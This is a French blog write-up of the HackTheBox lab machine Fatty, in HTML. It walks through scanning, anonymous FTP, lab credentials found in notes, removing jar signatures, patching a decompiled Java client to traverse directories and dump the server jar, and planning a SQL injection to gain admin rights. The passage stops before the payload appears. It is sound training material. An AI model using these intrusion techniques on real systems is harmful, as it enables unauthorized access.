@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="fr">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>HackTheBox - Fatty Write-Up | La sécurité à la française</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noodp" />
+<meta name="Description" content="Driikolu, la sécurité à la française"><link rel="prev" href="/2020/03/install_arch_chiffre_uefi/" /><link rel="canonical" href="/2020/08/fatty-wu/" />
+<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff"><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HackTheBox - Fatty Write-Up"/>
+<meta name="twitter:description" content="Durant le confinement, j&rsquo;étais particulièrement actif sur HackTheBox. Ayant fait toutes les boxs que je jugeait &ldquo;à ma portée&rdquo; à un moment je m&rsquo;étais lancé dans la quête (qui me paraissait impossible) d&rsquo;une box notée Insane !
+Ainsi j&rsquo;ai réussi Fatty non sans difficulté. J&rsquo;ai trouvé l&rsquo;expérience assez intéréssante pour en faire un Write-Up que vous pouvez lire juste en dessous !
+Trouver un point d&rsquo;entrée 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  sudo nmap -p 0-10000 -T5 -Pn -O -sV 10."/>
+<script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox - Fatty Write-Up",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/2020\/08\/fatty-wu\/"
+        },"image": {
+                "@type": "ImageObject",
+                "url": "\/cover.png",
+                "width":  800 ,
+                "height":  600 
+            },"genre": "posts","wordcount":  3263 ,
+        "url": "\/2020\/08\/fatty-wu\/","datePublished": "2020-08-09T22:13:45\u002b02:00","dateModified": "2020-08-09T22:13:45\u002b02:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+                "@type": "Organization",
+                "name": "Driikolu",
+                "logo": {
+                "@type": "ImageObject",
+                "url": "\/logo.png",
+                "width":  127 ,
+                "height":  40 
+                }
+            },"description": ""
+    }
+    </script><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/css/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/css/lib/animate/animate.min.css"></head>
+    <body><script>
+            window.isDark = (window.localStorage && window.localStorage.getItem('theme')) === 'dark';
+            window.isDark && document.body.classList.add('dark-theme');
+        </script><div class="wrapper"><nav class="navbar">
+    <div class="navbar-container">
+        <div class="navbar-header animated bounceIn">
+            <a href="/">La sécurité à la française</a>
+        </div>
+        <div class="navbar-menu"><a class="menu-item" href="/categories/articles" title="">Articles</a><a class="menu-item" href="/categories/writeups" title="">Write-Ups</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/about" title="">À propos</a><a href="javascript:void(0);" class="theme-switch"><i class="fas fa-adjust fa-rotate-180 fa-fw" title="Switch Theme"></i></a>
+        </div>
+    </div>
+</nav><nav class="navbar-mobile">
+    <div class="navbar-container">
+        <div class="navbar-header">
+            <div class="navbar-header-title animated bounceIn">
+                <a href="/">La sécurité à la française</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="navbar-menu" id="mobile-menu"><a class="menu-item" href="/categories/articles" title="">Articles</a><a class="menu-item" href="/categories/writeups" title="">Write-Ups</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/about" title="">À propos</a><a href="javascript:void(0);" class="theme-switch"><i class="fas fa-adjust fa-rotate-180 fa-fw" title="Switch Theme"></i></a>
+        </div>
+    </div>
+</nav><main class="main">
+                <div class="container"><article class="page"><h1 class="post-title animated flipInX">HackTheBox - Fatty Write-Up</h1><div class="post-meta">
+            <div class="post-meta-main"><a class="author" href="/" rel="author" target="_blank">
+                    <i class="fas fa-user-circle fa-fw"></i>Driikolu
+                </a>&nbsp;</div>
+            <div class="post-meta-other"><i class="far fa-calendar-alt fa-fw"></i><time datetime=2020-08-09>2020-08-09</time>&nbsp;
+                <i class="fas fa-pencil-alt fa-fw"></i>about 3263 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>16 min&nbsp;</div>
+        </div><div class="post-content"><p>Durant le confinement, j&rsquo;étais particulièrement actif sur HackTheBox. Ayant fait toutes les boxs que je jugeait &ldquo;à ma portée&rdquo; à un moment je m&rsquo;étais lancé dans la quête (qui me paraissait impossible) d&rsquo;une box notée <em>Insane</em> !</p>
+<p>Ainsi j&rsquo;ai réussi <strong>Fatty</strong> non sans difficulté. J&rsquo;ai trouvé l&rsquo;expérience assez intéréssante pour en faire un Write-Up que vous pouvez lire juste en dessous !</p>
+<h1 id="trouver-un-point-dentrée">Trouver un point d&rsquo;entrée</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo nmap -p 0-10000 -T5 -Pn -O -sV 10.10.10.174
+	Nmap scan report <span class="k">for</span> 10.10.10.174
+	Host is up <span class="o">(</span>0.039s latency<span class="o">)</span>.
+	Not shown: <span class="m">9996</span> closed ports
+	PORT     STATE SERVICE            VERSION
+	21/tcp   open  ftp                vsftpd 2.0.8 or later
+	22/tcp   open  ssh                OpenSSH 7.4p1 Debian 10+deb9u7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+	1337/tcp open  ssl/waste?
+	1338/tcp open  ssl/wmc-log-svc?
+	1339/tcp open  ssl/kjtsiteserver?
+	<span class="m">3</span> services unrecognized despite returning data. If you know the service/version, please 	submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+	<span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
+	SF-Port1337-TCP:V<span class="o">=</span>7.80%T<span class="o">=</span>SSL%I<span class="o">=</span>7%D<span class="o">=</span>4/4%Time<span class="o">=</span>5E88607F%P<span class="o">=</span>x86_64-unknown-linu
+	SF:x-gnu%r<span class="o">(</span>NULL,80,<span class="s2">&#34;\xe4\xdb\xb8\xe4_\x13\x96T\t\xf3r\xa7m\xc8h\x87\xc8\xf
+</span><span class="s2">	&lt;REDACTED&gt;
+</span><span class="s2">	==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+</span><span class="s2">	SF-Port1338-TCP:V=7.80%T=SSL%I=7%D=4/4%Time=5E88607F%P=x86_64-unknown-linu
+</span><span class="s2">	SF:x-gnu%r(NULL,80,&#34;</span>C<span class="se">\x</span>ec<span class="se">\&#34;</span>r<span class="se">\x</span>fd<span class="se">\x</span>89<span class="o">}</span><span class="se">\|\x</span>1d<span class="se">\x</span>ddW<span class="se">\x</span>1b<span class="se">\x</span>f8ux<span class="se">\x</span>f6<span class="se">\x</span>15B<span class="se">\x</span>f4<span class="se">\x</span><span class="m">9</span>
+	&lt;REDACTED&gt;
+	<span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
+	SF-Port1339-TCP:V<span class="o">=</span>7.80%T<span class="o">=</span>SSL%I<span class="o">=</span>7%D<span class="o">=</span>4/4%Time<span class="o">=</span>5E88607F%P<span class="o">=</span>x86_64-unknown-linu
+	SF:x-gnu%r<span class="o">(</span>NULL,80,<span class="s2">&#34;\&#34;\.\x0b\xb1\xcfd\x1a\xc3\x9c\xce\0\xd7\x982\xac\x99\x
+</span><span class="s2">	&lt;REDACTED&gt;
+</span><span class="s2">	Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A
+</span><span class="s2">	or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.12 (94%), Linux 3.13 (94%), Linux
+</span><span class="s2">	3.16 	(94%), Linux 3.18 (94%), Linux 3.8 - 3.11 (94%), Linux 4.4 (94%)
+</span><span class="s2">	No exact OS matches for host (test conditions non-ideal).
+</span><span class="s2">	Network Distance: 2 hops
+</span><span class="s2">	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></code></pre></td></tr></table>
+</div>
+</div><p>On peut voir :</p>
+<ul>
+<li>1 service FTP (21)</li>
+<li>1 service SSH (22)</li>
+<li>3 services inconnus (1337,1338,1339)</li>
+</ul>
+<a class="post-dummy-target" id="le-ftp"></a><h2>Le FTP</h2>
+<p>Dans un premier temps, l&rsquo;option la plus logique est de tester une connexion anonyme au FTP.</p>
+<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/fatty_anonymous_ftp.png" alt="Connexion FTP en anonyme" class="lazyload"><figcaption class="image-caption">Connexion FTP en anonyme</figcaption></figure></p>
+<p>On a en effet un accès et quelques fichiers potentiellement intéréssants</p>
+<ul>
+<li>3 fichiers textes</li>
+<li>1 fichier executable jar</li>
+</ul>
+<p>On s&rsquo;empresse de récupérer tous ces fichiers puis on lit les notes.</p>
+<p><u>Note 1</u></p>
+<blockquote>
+<p>Dear members,</p>
+<p>because of some security issues we moved the port of our fatty java server from 8000 to the hidden and undocumented port 1337.
+Furthermore, we created two new instances of the server on port 1338 and 1339. They offer exactly the same server and it would be nice
+if you use different servers from day to day to balance the server load.</p>
+<p>We were too lazy to fix the default port in the &lsquo;.jar&rsquo; file, but since you are all senior java developers you should be capable of
+doing it yourself ;)</p>
+<p>Best regards,
+qtc</p>
+</blockquote>
+<p><u>Note 2</u></p>
+<blockquote>
+<p>Dear members,</p>
+<p>we are currently experimenting with new java layouts. The new client uses a static layout. If your
+are using a tiling window manager or only have a limited screen size, try to resize the client window
+until you see the login from.</p>
+<p>Furthermore, for compatibility reasons we still rely on Java 8. Since our company workstations ship Java 11
+per default, you may need to install it manually.</p>
+<p>Best regards,
+qtc</p>
+</blockquote>
+<p><u>Note 3</u></p>
+<blockquote>
+<p>Dear members,</p>
+<p>We had to remove all other user accounts because of some seucrity issues.
+Until we have fixed these issues, you can use my account:</p>
+<p>User: qtc
+Pass: clarabibi</p>
+<p>Best regards,
+qtc</p>
+</blockquote>
+<p>Bien&hellip; La suite se passe donc sur le client jar.</p>
+<h1 id="le-client-jar">Le client jar</h1>
+<p>La première chose à faire c&rsquo;est d&rsquo;essayer d&rsquo;executer le client normalement. Pour cela, rien de plus simple !</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">java -jar fatty-client.jar
+</code></pre></td></tr></table>
+</div>
+</div><p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/fatty_client_login.png" alt="Page de login du client jar" class="lazyload"><figcaption class="image-caption">Page de login du client jar</figcaption></figure></p>
+<p>On arrive sur une page de login, on test les identifiants donnés dans la 3ème note ( qtc / clarabibi ) et&hellip; Ça ne fonctionne pas. On obient un <em>Connection Error !</em></p>
+<a class="post-dummy-target" id="réussir-à-se-connecter"></a><h2>Réussir à se connecter</h2>
+<p>Si on se réfère à la première note : le port du serveur à changé, il est passé de 8000 à 1337 (et 1338, 1339 sans doute pour éviter les problèmes s&rsquo;il y a trop de joueurs à la fois). Il faut donc trouver un moyen d&rsquo;arranger tout ça.</p>
+<p>On a besoin d&rsquo;un peu plus d&rsquo;informations. On va donc regarder dans le jar.</p>
+<p>Basiquement, les jar ne sont que des archives de projet java.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">file fatty-client.jar
+	fatty-client.jar: Zip archive data, at least v2.0 to extract
+</code></pre></td></tr></table>
+</div>
+</div><p>Donc on va juste decompresser l&rsquo;archive et regarder son contenu.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">mkdir jar_content
+<span class="nb">cd</span> jar_content
+unzip ../fatty-client.jar
+</code></pre></td></tr></table>
+</div>
+</div><p>On y trouve un fichier <strong>beans.xml</strong>, celui-ci sera utilisé par Spring pour la construction d&rsquo;objets. Ce fichier contient dans notre cas les informations de connexion au serveur :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;connectionContext&#34;</span> <span class="na">class =</span> <span class="s">&#34;htb.fatty.shared.connection.ConnectionContext&#34;</span><span class="nt">&gt;</span>
+   <span class="nt">&lt;constructor-arg</span> <span class="na">index=</span><span class="s">&#34;0&#34;</span> <span class="na">value =</span> <span class="s">&#34;server.fatty.htb&#34;</span><span class="nt">/&gt;</span>
+   <span class="nt">&lt;constructor-arg</span> <span class="na">index=</span><span class="s">&#34;1&#34;</span> <span class="na">value =</span> <span class="s">&#34;8000&#34;</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;/bean&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Je vais donc tout simplement les modifier pour qu&rsquo;ils collent au serveur auquel je veux me connecter.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;connectionContext&#34;</span> <span class="na">class =</span> <span class="s">&#34;htb.fatty.shared.connection.ConnectionContext&#34;</span><span class="nt">&gt;</span>
+   <span class="nt">&lt;constructor-arg</span> <span class="na">index=</span><span class="s">&#34;0&#34;</span> <span class="na">value =</span> <span class="s">&#34;10.10.10.174&#34;</span><span class="nt">/&gt;</span>
+   <span class="nt">&lt;constructor-arg</span> <span class="na">index=</span><span class="s">&#34;1&#34;</span> <span class="na">value =</span> <span class="s">&#34;1337&#34;</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;/bean&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Ensuite, je n&rsquo;ai plus qu&rsquo;à recréer l&rsquo;archive et à l&rsquo;executer</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">zip -r ../modified-client.jar *
+<span class="nb">cd</span> ..
+java -jar modifier-client.jar
+</code></pre></td></tr></table>
+</div>
+</div><p>On retente la connexion avec les identifiants trouvés plus tôt et&hellip; On obtient une erreur.</p>
+<blockquote>
+<p>Exception in thread &ldquo;AWT-EventQueue-0&rdquo; org.springframework.beans.factory.BeanDefinitionStoreException: Unexpected exception parsing XML document from class path resource [beans.xml]; nested exception is java.lang.SecurityException: SHA-256 digest error for beans.xml</p>
+</blockquote>
+<p>En réalité, ce n&rsquo;est pas très grave. Le jar vérifie juste son intégrité via les signatures de fichiers et puisqu&rsquo;on a modifié <strong>beans.xml</strong>, sa signature a changé. On va donc supprimer les fichiers permettant cette vérification.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">zip -d modified-client.jar <span class="s1">&#39;META-INF/*.SF&#39;</span> <span class="s1">&#39;META-INF/*.RSA&#39;</span> <span class="s1">&#39;META-INF/*SF&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>On relance le jar, et cette fois la connexion fonctionne \o/</p>
+<a class="post-dummy-target" id="obtenir-le-code-du-serveur"></a><h2>Obtenir le code du serveur</h2>
+<p>Une fois connecté au serveur via le client, on a plusieurs fonctionnalités qui s&rsquo;offrent à nous :</p>
+<ul>
+<li><em>Whoami</em> - Pour avoir notre login et notre role (dans notre cas <strong>qtc</strong> et <strong>user</strong>)</li>
+<li><em>Connection Test</em> - Pour tester la connexion avec le serveur</li>
+<li><em>File Browser</em> - Pour sélectionner un dossier et pouvoir ensuite lire les fichiers qu&rsquo;il contient</li>
+</ul>
+<p>Ainsi que des fonctionnalités &ldquo;grisées&rdquo;, sans doute accessible uniquement aux admins :</p>
+<ul>
+<li><em>ChangePassword</em></li>
+<li><em>Uname</em></li>
+<li><em>Users</em></li>
+<li><em>Netstat</em></li>
+<li><em>IpConfig</em></li>
+</ul>
+<p>Pour commencer, on essaie de lire un fichier du serveur. On sait qu&rsquo;il s&rsquo;agit d&rsquo;un Linux, on va donc tenter un <em>Path Traversal</em> via le <em>File Browser</em> pour lire le fichier <em>/etc/passwd</em>.</p>
+<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/fatty_traversal_fail.png" alt="Path Traversal fail" class="lazyload"><figcaption class="image-caption">Path Traversal fail</figcaption></figure></p>
+<p>Visiblement, ça ne fonctionne pas, des caractères sont supprimés&hellip; Même en essayant de &ldquo;bypass&rdquo; ce nettoyage, impossible d&rsquo;effectuer un <em>Path Traversal</em>.</p>
+<p>Il faudrait avoir accès au code du client afin de comprendre comment il fonctionne. Et un outil existe pour décompiler du java : <strong>jd-gui</strong> !</p>
+<p>On va tout simplement utiliser jd-gui pour récupérer l&rsquo;intégralité des fichiers sources du projet. Pour cela on ouvre le projet (le modifié afin de toujours avoir le beans.xml voulu).</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">jd-gui modified-client.jar
+</code></pre></td></tr></table>
+</div>
+</div><p>Puis on sauvegarde les sources (<em>File &gt; Save All Sources</em>).</p>
+<p>On obtient alors un magnifique zip que l&rsquo;on va décompresser.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">mkdir client_sources
+<span class="nb">cd</span> client_sources
+unzip ../modified-client_sources.zip
+</code></pre></td></tr></table>
+</div>
+</div><p>Le dossier <em>org</em> contient apparemment des librairies importées. On va donc se concentrer sur le dossier <em>htb/fatty</em> qui a l&rsquo;air de contenir du code propre à notre client. On va donc dans ce dossier et on recherche les fonctions qui nous intéressent.</p>
+<p>Dans notre cas on veut voir comment le <em>File Browser</em> fonctionne, on va donc faire une recherche par rapport à certains mots clefs. Par exemple le mot clef <strong>configs</strong> qui correspond à l&rsquo;un des dossiers que l&rsquo;on peut explorer.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">grep -lR configs
+	client/gui/ClientGuiTest.java
+</code></pre></td></tr></table>
+</div>
+</div><p>On fouille un peu le code java et on retrouve très vite la partie qui nous intéresse : Comment est configuré le dossier avec le <em>File Browser</em>.</p>
+<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/fatty_filebrowser_code.png" alt="Code configuration dossier configs dans le File Browser" class="lazyload"><figcaption class="image-caption">Code configuration dossier configs dans le File Browser</figcaption></figure></p>
+<p>Sachant que toutes les options de <em>File Browser</em> nous emmènent dans <em>/opt/fatty/files/&lt;OPTION CHOISIE&gt;</em> on va essayer de modifier les strings <em>configs</em> de cette fonction pas <em>..</em> voir si on peut accéder à <em>/opt/fatty</em>.</p>
+<p>On retourne dans la racine des sources (ici <em>client_sources</em>) et on compile tout ça.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> ../..
+<span class="nb">shopt</span> -s globstar <span class="c1">#Pour faciliter la compilation juste après</span>
+javac **/*.java
+</code></pre></td></tr></table>
+</div>
+</div><p>Ici on a une erreur avec la compilation de spring ! Il suffit de récupérer le contenu déjà compilé que l&rsquo;on a décompressé tout à l&rsquo;heure.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">rm -rf org/
+cp -r ../jar_content/org/ .
+javac **/*.java
+zip -r ../modified-client.jar *
+</code></pre></td></tr></table>
+</div>
+</div><p>On relance le client, se connecte et va dans <em>File Browser &gt; Configs</em> et là&hellip; Le contenu affiché diffère de la dernière fois.</p>
+<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/fatty_opt_/img/fatty_content.png" alt="Contenu /opt/fatty" class="lazyload"><figcaption class="image-caption">Contenu /opt/fatty</figcaption></figure></p>
+<p>Visiblement <em>logs</em>, <em>tar</em> et <em>files</em> sont des dossiers. On va alors lire <em>start.sh</em>.</p>
+<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/fatty_start_sh_content.png" alt="Contenu start.sh" class="lazyload"><figcaption class="image-caption">Contenu start.sh</figcaption></figure></p>
+<p>Apparemment, nous sommes dans un docker. On va malgré tout continuer et essayer de récupérer <em>fatty-server.jar</em>.</p>
+<p>On se frotte à un problème : Le client ne nous permet que d&rsquo;afficher les fichiers&hellip; Il faut donc trouver un moyen de télécharger ce fichier. En réfléchissant, j&rsquo;ai décider d&rsquo;utiliser une méthode &ldquo;sale&rdquo; mais efficace : écrire le retour du <em>Open</em> directement dans un fichier.</p>
+<p>Il faut donc modifier le code (encore).</p>
+<p>Donc là encore il faut trouver le moment de reception du contenu des fichiers lus. On va se baser sur le <em>Open</em> dans le GUI. On trouve le nom <em>openFileButton</em> auquel est accroché une action et pour obtenir la réponse cette action fait <strong>this.invoker.open()</strong>.</p>
+<p>Malheureusement, cela nous sort un String, je veux être sur de ne pas avoir de problème, je veux le byte-string correspondant. On va remonter cette fonction <em>open</em>.</p>
+<p>Pour ça, on voit que invoker vient d&rsquo;un autre fichier java : <strong>htb/fatty/client/methods/Invoker.java</strong> et on retrouve le code de la fonction <em>open</em>.</p>
+<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/fatty_open_code.png" alt="Code de la fonction open" class="lazyload"><figcaption class="image-caption">Code de la fonction open</figcaption></figure></p>
+<p>On voit bien le moment où il récupère le contenu de la réponse. Ici il fait un <strong>getContentAsString()</strong>. On va plutôt utiliser la méthode <strong>getContent()</strong> qui va récupérer un objet de type <strong>byte[]</strong> et le rediriger vers un fichier.</p>
+<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/fatty_modified_open.png" alt="Code modifié de open" class="lazyload"><figcaption class="image-caption">Code modifié de open</figcaption></figure></p>
+<p>On a donc rajouté les lignes suivantes</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="k">try</span> <span class="o">(</span><span class="n">FileOutputStream</span> <span class="n">fos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">&#34;/tmp/fatty-server.jar&#34;</span><span class="o">))</span> <span class="o">{</span>
+	<span class="n">fos</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">response</span><span class="o">.</span><span class="na">getContent</span><span class="o">());</span>			
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>En oubliant pas d&rsquo;importer les bibliothèques java nécessaires</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.io.File</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Donc à chaque fois que l&rsquo;on va utiliser <em>open</em>, le contenu de la réponse sera écrit dans ce fichier.</p>
+<p>On recompile, recréé le jar et on va utiliser la fonction <em>open</em> sur <em>fatty-server.jar</em>. Puis on regarde si le fichier a bien été créé.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">file /tmp/fatty-server.jar
+	/tmp/fatty-server.jar: Zip archive data, at least v1.0 to extract
+</code></pre></td></tr></table>
+</div>
+</div><p>Super ! On a plus qu&rsquo;à le récupérer et surtout&hellip; Récupérer ses sources, là encore avec <strong>jd-gui</strong>.</p>
+<p>Maintenant la question est&hellip; Qu&rsquo;est-ce qu&rsquo;on en fait ?</p>
+<p>On a vu qu&rsquo;il y avait des options &ldquo;grisée&rdquo;, on en a déduit qu&rsquo;elles n&rsquo;étaient pas accessible au role <em>user</em>. On va donc essayer d&rsquo;obtenir un role <em>admin</em>. On part donc en analyse statique du code du serveur.</p>
+<a class="post-dummy-target" id="obtenir-plus-de-droits"></a><h2>Obtenir plus de droits</h2>
+<p>En regardant rapidement le code du serveur, on voit qu&rsquo;il y a un code pour gérer la base de données (<em>htb/fatty/server/databaseF/attyDbSession.java</em>) et dans ce code se trouve une requête SQL.</p>
+<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/fatty_server_logging.png" alt="Code de connexion utilisateur sur le serveur" class="lazyload"><figcaption class="image-caption">Code de connexion utilisateur sur le serveur</figcaption></figure></p>
+<p>Et surtout, fait intéressant, la requête est vulnérable aux injections ! Et elle récupère 5 données que l&rsquo;on peut facilement comprendre :</p>
+<ul>
+<li>id : l&rsquo;ID de l&rsquo;utilisateur (sans doute une clef primaire de la table)</li>
+<li>username : le nom de l&rsquo;utilisateur (jusque là on utilisait <em>qtc</em>)</li>
+<li>email : le mail de l&rsquo;utilisateur</li>
+<li>password : le mot de passe de l&rsquo;utilisateur (jusque là <em>clarabibi</em>)</li>
+<li>role : le rôle de l&rsquo;utilisateur (jusque là <em>user</em>)</li>
+</ul>
+<p>Il faut donc forger une requête avec le même username, le même hash de mot de passe mais un rôle <strong>admin</strong>.</p>
+<p>On peut voir que pour la vérification du mot de passe, celle-ci se fait en vérifiant le mot de passe de l&rsquo;utilisateur requêté et celui qui a été envoyé pas le client. On va donc faire une modification dans le client pour envoyer un &ldquo;hash&rdquo; connu.</p>
+<p>Et pour ça, ça se passe dans <em>htb/fatty/shared/resources/User.java</em> avec la fonction <em>setPassword()</em></p>
+<p><figure><img src="/svg/loading.min.svg" data-sizes="auto" data-src="/img/fatty_setPassword.png" alt="Code setPassword() du client" class="lazyload"><figcaption class="image-caption">Code setPassword() du client</figcaption></figure></p>
+<p>On va tout simplement modifier la dernière ligne de ce code par :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="k">this</span><span class="o">.</span><span class="na">password</span> <span class="o">=</span> <span class="s">&#34;ABCD&#34;</span><span class="o">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>On compile, recréé le jar et pour se connecter on met en guise de username :</p>
+<blockquote>
